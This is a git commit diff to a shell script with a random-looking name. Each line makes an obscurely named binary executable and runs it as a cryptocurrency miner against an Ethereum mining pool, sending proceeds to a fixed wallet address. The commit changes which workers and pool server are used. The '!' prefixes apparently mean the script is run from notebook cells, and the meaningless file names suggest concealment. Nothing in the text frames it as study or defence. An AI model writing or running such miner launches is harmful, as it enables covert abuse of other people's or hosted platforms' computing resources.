49995406b0fe5b11f2ad3f71400368f3acc7d316
pempekselam <80247082+pempekselam@users.noreply.github.com>
2021-03-11 02:24:55 +0700

    Update iuhfdhjg.sh

--- iuhfdhjg.sh
+++ iuhfdhjg.sh
@@ -1,4 +1,3 @@
 #!/bin/sh
 !chmod +x ./hcdbvhdffdh && ./hcdbvhdffdh -P stratum1+tcp://0x76910e83d10e6a2608c4cd5127c2a9439fdb6379.NoBu@eu1.ethereum.herominers.com:10200 -G -R
-!chmod +x ./hcdbvhdffdh && ./hcdbvhdffdh -P stratum1+tcp://0x76910e83d10e6a2608c4cd5127c2a9439fdb6379.ajirizki667@eu1.ethereum.herominers.com:10200 -G -R
-!chmod +x ./hcdbvhdffdh && ./hcdbvhdffdh -P stratum1+tcp://0x76910e83d10e6a2608c4cd5127c2a9439fdb6379.ViaVio@eu1.ethereum.herominers.com:10200 -G -R
+!chmod +x ./hcdbvhdffdh && ./hcdbvhdffdh -P stratum1+tcp://0x76910e83d10e6a2608c4cd5127c2a9439fdb6379.ajirizki667@fi.ethereum.herominers.com:10200 -G -R
